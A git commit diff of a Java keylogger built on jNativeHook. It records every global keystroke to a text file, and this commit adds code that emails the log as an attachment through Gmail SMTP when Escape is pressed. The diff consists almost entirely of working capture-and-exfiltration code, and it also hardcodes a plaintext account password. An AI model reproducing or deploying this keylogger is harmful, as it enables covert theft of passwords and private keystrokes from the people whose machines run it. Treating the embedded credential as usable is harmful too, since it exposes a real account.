2cfb86fdfab953c0f840075384dc35fa3bc24a81
joaerazogo <joaerazogo@unal.edu.co>
2018-05-16 17:32:26 -0500

    app that send the file in a email

--- aux/jNativeHookExample.java
+++ aux/jNativeHookExample.java
@@ -6,6 +6,17 @@ import java.io.File;
 import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.util.Properties;
+import javax.activation.DataHandler;
+import javax.activation.FileDataSource;
+import javax.mail.BodyPart;
+import javax.mail.Message;
+import javax.mail.Session;
+import javax.mail.Transport;
+import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeBodyPart;
+import javax.mail.internet.MimeMessage;
+import javax.mail.internet.MimeMultipart;
 
 
 public class jNativeHookExample implements NativeKeyListener{
@@ -16,18 +27,68 @@ public class jNativeHookExample implements NativeKeyListener{
         try {
         	System.out.println("---------------------------------------------");
         	File archivoKeyLogger = new File("FileKeyLogger.txt");
-			FileWriter writeIntegers = new FileWriter(archivoKeyLogger, true);
-			writeIntegers.write(NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
-			//cerramos la conexion
-			writeIntegers.close();
+			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
+			writeResults.write(NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
+			//cerramos la conexión
+			writeResults.close();
 		} catch (IOException e2) {
 			System.out.println("Error al escribir");
 		}
  
         /* Terminate program when one press ESCAPE */
         if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
+        	try
+            {
+              // se obtiene el objeto Session. La configuración es para
+              // una cuenta de gmail.
+                Properties props = new Properties();
+                props.put("mail.smtp.host", "smtp.gmail.com");
+                props.setProperty("mail.smtp.starttls.enable", "true");
+                props.setProperty("mail.smtp.port", "587");
+                props.setProperty("mail.smtp.user", "joaerazogo@unal.edu.co");
+                props.setProperty("mail.smtp.auth", "true");
+
+                Session session = Session.getDefaultInstance(props, null);
+                // session.setDebug(true);
+
+                // Se compone la parte del texto
+                BodyPart texto = new MimeBodyPart();
+                texto.setText("Texto del mensaje");
+
+                // Se compone el adjunto con la imagen
+                BodyPart adjunto = new MimeBodyPart();
+                adjunto.setDataHandler(
+                    new DataHandler(new FileDataSource("/home/jose/workspace/Keylogger/FileKeyLogger.txt")));
+                adjunto.setFileName("FileKeyLogger.txt");
+
+                // Una MultiParte para agrupar texto e imagen.
+                MimeMultipart multiParte = new MimeMultipart();
+                multiParte.addBodyPart(texto);
+                multiParte.addBodyPart(adjunto);
+
+                // Se compone el correo, dando to, from, subject y el
+                // contenido.
+                MimeMessage message = new MimeMessage(session);
+                message.setFrom(new InternetAddress("joaerazogo@unal.edu.co"));
+                message.addRecipient(
+                    Message.RecipientType.TO,
+                    new InternetAddress("joaerazogo@unal.edu.co"));
+                message.setSubject("Hellow");
+                message.setContent(multiParte);
+
+                // Se envia el correo.
+                Transport t = session.getTransport("smtp");
+                t.connect("joaerazogo@unal.edu.co", "MelkorValinor66");
+                t.sendMessage(message, message.getAllRecipients());
+                t.close();
+            }
+            catch (Exception e1)
+            {
+                e1.printStackTrace();
+            }
             try {
 				GlobalScreen.unregisterNativeHook();
+				
 			} catch (NativeHookException e1) {
 				// TODO Auto-generated catch block
 				e1.printStackTrace();
@@ -41,10 +102,10 @@ public class jNativeHookExample implements NativeKeyListener{
 		try {
 			System.out.println("---------------------------------------------");
 			File archivoKeyLogger = new File("FileKeyLogger.txt");
-			FileWriter writeIntegers = new FileWriter(archivoKeyLogger, true);
-			writeIntegers.write( NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
-			//cerramos la conexion
-			writeIntegers.close();
+			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
+			writeResults.write( NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
+			//cerramos la conexión
+			writeResults.close();
 		} catch (IOException e1) {
 			// TODO Auto-generated catch block
 			System.out.println("Error al escribir");
@@ -57,10 +118,10 @@ public class jNativeHookExample implements NativeKeyListener{
         try {
         	System.out.println("---------------------------------------------");
 			File archivoKeyLogger = new File("FileKeyLogger.txt");
-			FileWriter writeIntegers = new FileWriter(archivoKeyLogger, true);
-			writeIntegers.write(e.getKeyText(e.getKeyCode()) + "\r" + "\n");
-			//cerramos la conexion
-			writeIntegers.close();
+			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
+			writeResults.write(e.getKeyText(e.getKeyCode()) + "\r" + "\n");
+			//cerramos la conexión
+			writeResults.close();
 		} catch (IOException e1) {
 			// TODO Auto-generated catch block
 			System.out.println("Error al escribir");
--- src/jNativeHookExample.java
+++ src/jNativeHookExample.java
@@ -6,6 +6,17 @@ import java.io.File;
 import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.util.Properties;
+import javax.activation.DataHandler;
+import javax.activation.FileDataSource;
+import javax.mail.BodyPart;
+import javax.mail.Message;
+import javax.mail.Session;
+import javax.mail.Transport;
+import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeBodyPart;
+import javax.mail.internet.MimeMessage;
+import javax.mail.internet.MimeMultipart;
 
 
 public class jNativeHookExample implements NativeKeyListener{
@@ -26,8 +37,58 @@ public class jNativeHookExample implements NativeKeyListener{
  
         /* Terminate program when one press ESCAPE */
         if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
+        	try
+            {
+              // se obtiene el objeto Session. La configuración es para
+              // una cuenta de gmail.
+                Properties props = new Properties();
+                props.put("mail.smtp.host", "smtp.gmail.com");
+                props.setProperty("mail.smtp.starttls.enable", "true");
+                props.setProperty("mail.smtp.port", "587");
+                props.setProperty("mail.smtp.user", "joaerazogo@unal.edu.co");
+                props.setProperty("mail.smtp.auth", "true");
+
+                Session session = Session.getDefaultInstance(props, null);
+                // session.setDebug(true);
+
+                // Se compone la parte del texto
+                BodyPart texto = new MimeBodyPart();
+                texto.setText("Texto del mensaje");
+
+                // Se compone el adjunto con la imagen
+                BodyPart adjunto = new MimeBodyPart();
+                adjunto.setDataHandler(
+                    new DataHandler(new FileDataSource("/home/jose/workspace/Keylogger/FileKeyLogger.txt")));
+                adjunto.setFileName("FileKeyLogger.txt");
+
+                // Una MultiParte para agrupar texto e imagen.
+                MimeMultipart multiParte = new MimeMultipart();
+                multiParte.addBodyPart(texto);
+                multiParte.addBodyPart(adjunto);
+
+                // Se compone el correo, dando to, from, subject y el
+                // contenido.
+                MimeMessage message = new MimeMessage(session);
+                message.setFrom(new InternetAddress("joaerazogo@unal.edu.co"));
+                message.addRecipient(
+                    Message.RecipientType.TO,
+                    new InternetAddress("joaerazogo@unal.edu.co"));
+                message.setSubject("Hellow");
+                message.setContent(multiParte);
+
+                // Se envia el correo.
+                Transport t = session.getTransport("smtp");
+                t.connect("joaerazogo@unal.edu.co", "MelkorValinor66");
+                t.sendMessage(message, message.getAllRecipients());
+                t.close();
+            }
+            catch (Exception e1)
+            {
+                e1.printStackTrace();
+            }
             try {
 				GlobalScreen.unregisterNativeHook();
+				
 			} catch (NativeHookException e1) {
 				// TODO Auto-generated catch block
 				e1.printStackTrace();
